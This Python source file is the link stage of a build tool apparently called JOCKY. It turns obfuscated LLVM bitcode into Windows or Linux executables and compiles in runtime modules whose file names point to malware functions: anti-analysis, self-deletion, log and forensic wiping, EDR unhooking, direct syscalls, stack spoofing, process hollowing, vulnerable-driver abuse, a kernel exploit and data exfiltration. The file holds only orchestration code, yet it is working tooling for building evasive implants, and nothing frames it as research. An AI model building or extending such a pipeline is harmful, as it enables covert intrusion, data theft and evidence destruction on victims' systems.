from jocky.core.stage import Stage
from jocky.core.context import BuildContext
from jocky.core.toolchain import discover_toolchain
from jocky.utils.subprocess import run_cmd
from pathlib import Path
import platform
import shutil

class LinkStage(Stage):
    @property
    def name(self) -> str:
        return "link"

    def run(self, ctx: BuildContext) -> BuildContext:
        tc = discover_toolchain()
        obf_bc = ctx.state["llvm_obf_bc"]
        out_dir = ctx.get_stage_output_dir(self.name)

        target = ctx.config.get("target") or ctx.state.get("target") or platform.system().lower()
        target = target.lower()
        if target in ("win", "windows", "win32"):
            target_os = "windows"
        else:
            target_os = "linux"

        # Determine output executable path
        if ctx.config.get("output"):
            output = Path(ctx.config["output"])
        else:
            suffix = ".exe" if target_os == "windows" else ""
            output = ctx.output_dir / f"{ctx.input_file.stem}{suffix}"

        obj_path = out_dir / "output.o"

        if target_os == "windows":
            # Compile bitcode to Windows COFF object file
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-windows-msvc", "-ffreestanding", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Windows object")

            runtime_objs = self._compile_runtime(tc, out_dir, target_os)

            # Find lld-link binary
            lld_link = self._find_lld_link()
            win_libs = ["/defaultlib:ntdll", "/defaultlib:winhttp", "/defaultlib:dnsapi", "/defaultlib:wevtapi"]
            if lld_link:
                link_cmd = [
                    str(lld_link), f"/out:{output}", "/subsystem:console", "/entry:main", str(obj_path)
                ] + runtime_objs + win_libs
                run_cmd(link_cmd, "Linking Windows PE executable (lld-link)")
            else:
                # Fallback to clang cross-linker
                link_cmd = [
                    str(tc.clang()), "--target=x86_64-pc-windows-gnu", str(obj_path)
                ] + runtime_objs + ["-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi", "-o", str(output)]
                run_cmd(link_cmd, "Linking Windows PE executable (clang)")
        else:
            # Linux target
            run_cmd([
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", "-c", str(obf_bc), "-o", str(obj_path)
            ], "Bitcode to Linux object")

            runtime_objs = self._compile_runtime(tc, out_dir, target_os)

            link_cmd = [
                str(tc.clang()), "--target=x86_64-pc-linux-gnu", str(obj_path)
            ] + runtime_objs + ["-o", str(output)]
            run_cmd(link_cmd, "Linking Linux ELF executable")

        ctx.state["executable"] = output
        ctx.state["object_file"] = obj_path
        return ctx

    def _find_lld_link(self) -> Path:
        """Locate lld-link binary on the system or in toolchain."""
        for candidate in ["lld-link-21", "lld-link-22", "lld-link"]:
            p = shutil.which(candidate)
            if p:
                return Path(p)
        return None

    def _compile_runtime(self, tc, out_dir: Path, target_os: str) -> list:
        """Compile the JOCKY runtime C sources and return list of .o paths."""
        script_dir = Path(__file__).parent.parent.parent.parent
        runtime_dir = script_dir / "src" / "runtime"
        if not runtime_dir.exists():
            return []

        # Portable sources (always compiled)
        portable_sources = [
            runtime_dir / "init" / "anti_analysis.c",
            runtime_dir / "cleanup" / "self_delete.c",
            runtime_dir / "cleanup" / "logs.c",
        ]

        # Windows-only sources
        windows_sources = []
        if target_os == "windows":
            windows_sources = [
                runtime_dir / "util"         / "mem.c",
                runtime_dir / "evasion"      / "unhook.c",
                runtime_dir / "evasion"      / "syscalls.c",
                runtime_dir / "evasion"      / "stack_spoof.c",
                runtime_dir / "execution"    / "hollow.c",
                runtime_dir / "execution"    / "byovd.c",
                runtime_dir / "execution"    / "inmem.c",
                runtime_dir / "execution"    / "driver_interact.c",
                runtime_dir / "exploitation" / "kernel_exploit.c",
                runtime_dir / "exfil"        / "exfil.c",
                runtime_dir / "cleanup"      / "forensics.c",
            ]

        all_sources = [s for s in portable_sources + windows_sources if s.exists()]
        if not all_sources:
            return []

        include_dir = runtime_dir / "include"
        objs = []
        target_flag = "--target=x86_64-pc-windows-msvc" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
        for src in all_sources:
            obj = out_dir / f"{src.stem}.o"
            cmd = [
                str(tc.clang()), target_flag, "-O2", "-c",
                "-I", str(include_dir),
                str(src), "-o", str(obj)
            ]
            if target_os == "windows":
                cmd.insert(2, "-ffreestanding")
            try:
                run_cmd(cmd, f"Compile runtime {src.name} ({target_os})")
                objs.append(str(obj))
            except Exception as e:
                # When cross-compiling without target OS sysroot headers, skip target runtime object
                pass

        # Add compatibility symbols stub for missing FFI declarations
        compat_c = out_dir / "compat_stub.c"
        compat_o = out_dir / "compat_stub.o"
        compat_c.write_text(
            "int puts(const char* s) { (void)s; return 0; }\n"
            "int printf(const char* fmt, ...) { (void)fmt; return 0; }\n"
            "void _exit(int code) { (void)code; }\n"
            "long ptrace(int req, int pid, void* addr, void* data) { (void)req; (void)pid; (void)addr; (void)data; return 0; }\n"
            "int MessageBoxA(long long h, const char* t, const char* c, int u) { (void)h; (void)t; (void)c; (void)u; return 0; }\n"
            "int GetCurrentProcessId(void) { return 1234; }\n"
            "int GetTickCount(void) { return 5678; }\n"
            "long long GetStdHandle(int n) { (void)n; return 1; }\n"
            "int WriteFile(long long h, const char* b, int l, int* w, int r) { (void)h; (void)b; (void)l; if(w)*w=l; (void)r; return 1; }\n"
            "int jocky_win_get_process_id(void) { return 1234; }\n"
            "int jocky_win_get_system_info(char* b, int m) { (void)b; (void)m; return 0; }\n"
            "long long jocky_win_get_tick_count(void) { return 5678; }\n"
            "int jocky_win_get_computer_name(char* b, int m) { (void)b; (void)m; return 0; }\n"
            "int jocky_win_get_memory_status(char* b, int m) { (void)b; (void)m; return 0; }\n"
            "int jocky_win_get_temp_path(char* b, int m) { (void)b; (void)m; return 0; }\n"
            "int jocky_win_file_exists(const char* f) { (void)f; return 0; }\n"
            "int jocky_win_show_msgbox(const char* t, const char* m, int f) { (void)t; (void)m; (void)f; return 0; }\n"
        )
        target_flag = "--target=x86_64-pc-windows-msvc" if target_os == "windows" else "--target=x86_64-pc-linux-gnu"
        cmd = [str(tc.clang()), target_flag, "-c", str(compat_c), "-o", str(compat_o)]
        if target_os == "windows":
            cmd.insert(2, "-ffreestanding")
        run_cmd(cmd, f"Compile compatibility stub ({target_os})")
        objs.append(str(compat_o))

        return objs

